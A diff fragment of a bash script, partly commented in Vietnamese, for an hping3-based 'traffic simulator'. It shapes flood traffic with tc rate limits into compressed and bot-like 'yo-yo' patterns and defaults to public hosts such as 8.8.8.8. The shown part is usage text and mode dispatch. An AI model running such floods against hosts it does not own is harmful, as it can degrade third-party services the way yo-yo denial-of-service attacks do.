+        exit 1
     fi
-    
-    log "Connectivity test passed"
-    return 0
 }
 
-# Performance monitoring
-monitor_performance() {
-    while true; do
-        local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
-        local mem_usage=$(free | grep '^Mem' | awk '{printf "%.1f", $3/$2 * 100.0}')
-        local hping_count=$(pgrep -c hping3 || echo 0)
-        
-        log_debug "Performance: CPU=${cpu_usage}% MEM=${mem_usage}% HPING_PROCS=${hping_count}"
-        sleep 30
-    done &
-    
-    BACKGROUND_PIDS+=($!)
-}
-
-# Enhanced usage display
+# Hàm hiển thị usage
 show_usage() {
-    cat << 'EOF'
-HPING3 Traffic Simulator - Optimized Version
+    cat << EOF
+Usage: $0 [TARGET_IP] [INTERFACE] [DURATION] [COMPRESSION] [MODE] [YOYO_TYPE]
 
-USAGE:
-    ./script.sh [TARGET] [INTERFACE] [DURATION] [COMPRESSION] [MODE] [YOYO_TYPE]
+OPTIMIZATIONS:
+    - Uses TC qdisc TBF (Token Bucket Filter) for in-place rate control
+    - Single hping3 flood process instead of kill/spawn cycles
+    - Smooth rate transitions with 3-second intervals
+    - Automatic fallback to legacy mode if TC fails
 
 PARAMETERS:
-    TARGET       Target IP address (default: 8.8.8.8)
-    INTERFACE    Network interface (auto-detect if not specified)
-    DURATION     Duration in seconds (default: 300)
-    COMPRESSION  Time compression factor (default: 72)
-    MODE         Simulation mode (compressed|yoyo|demo|yoyo-demo)
-    YOYO_TYPE    Pattern type for yoyo mode (square|sawtooth|sine|burst|step|random)
+    TARGET_IP     - Target IP (default: 8.8.8.8)
+    INTERFACE     - Network interface (default: eth0)
+    DURATION      - Real duration in seconds (default: 300)
+    COMPRESSION   - Time compression factor (default: 72)
+    MODE          - tc-compressed, tc-yoyo, compressed (legacy), yoyo (legacy)
+    YOYO_TYPE     - square, sawtooth, burst (for yo-yo modes)
 
-EXAMPLES:
-    # Standard compressed simulation (5 min = 6 virtual hours)
-    ./script.sh 192.168.1.1 eth0 300 72 compressed
-    
-    # Bot-like square wave pattern
-    ./script.sh 8.8.8.8 wlan0 180 1 yoyo square
-    
-    # Demo all yo-yo patterns
-    ./script.sh 1.1.1.1 eth0 600 1 yoyo-demo
-    
-    # Ultra-fast compression (5 min = 7 virtual days)
-    ./script.sh 8.8.8.8 eth0 300 2016 compressed
+TC QDISC EXAMPLES:
+    $0 8.8.8.8 eth0 300 72 tc-compressed       # TC optimized compressed
+    $0 8.8.8.8 eth0 180 1 tc-yoyo square       # TC optimized yo-yo
+    $0 8.8.8.8 eth0 300 72 compressed          # Legacy mode
 
-ENVIRONMENT VARIABLES:
-    VERBOSE=true|false    Enable debug logging (default: true)
+TECHNICAL NOTES:
+    - Requires root privileges for tc qdisc manipulation
+    - Packet size assumed: ${PACKET_SIZE} bytes
+    - TC burst size: ${BURST_SIZE}
+    - TC latency: ${LATENCY}
+    - Bandwidth calculation: PPS × packet_size × 8 bits
+
+MONITORING:
+    - Monitor TC qdisc: tc -s qdisc show dev [interface]
+    - Log file: ${LOG_FILE}
 EOF
 }
 
-# Main execution với error handling
+# Main function
 main() {
-    # Validate inputs
-    validate_ip "$TARGET_IP" || exit 1
-    validate_interface "$INTERFACE" || exit 1
-    validate_numeric "$DURATION" "Duration" || exit 1
-    validate_numeric "$TIME_COMPRESSION" "Compression" || exit 1
+    local mode="${5:-tc-compressed}"
+    local yoyo_type="${6:-square}"
     
-    log "=== OPTIMIZED HPING3 TRAFFIC SIMULATOR ==="
-    log "Target: $TARGET_IP | Interface: $INTERFACE"
-    log "Duration: ${DURATION}s | Compression: ${TIME_COMPRESSION}x | Mode: $MODE"
+    log "=== TC QDISC OPTIMIZED HPING3 TRAFFIC SIMULATOR ==="
+    log "Target: $TARGET_IP"
+    log "Interface: $INTERFACE"
+    log "Duration: ${DURATION}s"
+    log "Compression: ${TIME_COMPRESSION}x"
+    log "Mode: $mode"
+    if [[ "$mode" == *"yoyo"* ]]; then
+        log "Yo-yo Type: $yoyo_type"
+    fi
+    log "Packet Size: ${PACKET_SIZE} bytes"
+    log "TC Burst: ${BURST_SIZE}, Latency: ${LATENCY}"
     
     check_dependencies
-    test_connectivity || log_warn "Proceeding despite connectivity issues"
     
-    # Start performance monitoring in verbose mode
-    [[ "$VERBOSE" == true ]] && monitor_performance
+    # Test connectivity
+    if ! ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
+        log "WARNING: Target $TARGET_IP may not be reachable"
+    fi
     
-    # Execute based on mode
-    case "$MODE" in
+    case "$mode" in
+        "tc-compressed")
+            generate_compressed_pattern_tc "$DURATION"
+            ;;
+        "tc-yoyo")
+            generate_yoyo_pattern_tc "$DURATION" "$yoyo_type"
+            ;;
         "compressed")
-            generate_compressed_pattern "$DURATION"
-            ;;
-        "yoyo")
-            generate_yoyo_pattern "$DURATION" "$YOYO_TYPE"
-            ;;
-        "demo"|"yoyo-demo")
-            log "Demo mode: Running multiple patterns..."
-            for pattern in square sawtooth burst step; do
-                log "Demo: $pattern pattern (60s)"
-                generate_yoyo_pattern 60 "$pattern"
-                sleep 5
-            done
+            generate_compressed_pattern_legacy "$DURATION"
             ;;
         *)
-            log_error "Unknown mode: $MODE"
+            log "ERROR: Unknown mode: $mode"
+            log "Available modes: tc-compressed, tc-yoyo, compressed"
             show_usage
             exit 1
             ;;
     esac
     
-    log "=== SIMULATION COMPLETED SUCCESSFULLY ==="
+    log "=== SIMULATION COMPLETED ==="
+    log "Log file: $LOG_FILE"
 }
 
-# Command line processing
-case "${1:-}" in
-    -h|--help) show_usage; exit 0 ;;
-    -v|--version) echo "HPING3 Traffic Simulator v2.0 (Optimized)"; exit 0 ;;
-esac
+# Xử lý command line
+if [[ "$1" == "-h" || "$1" == "--help" ]]; then
+    show_usage
+    exit 0
+fi
 
 main "$@"
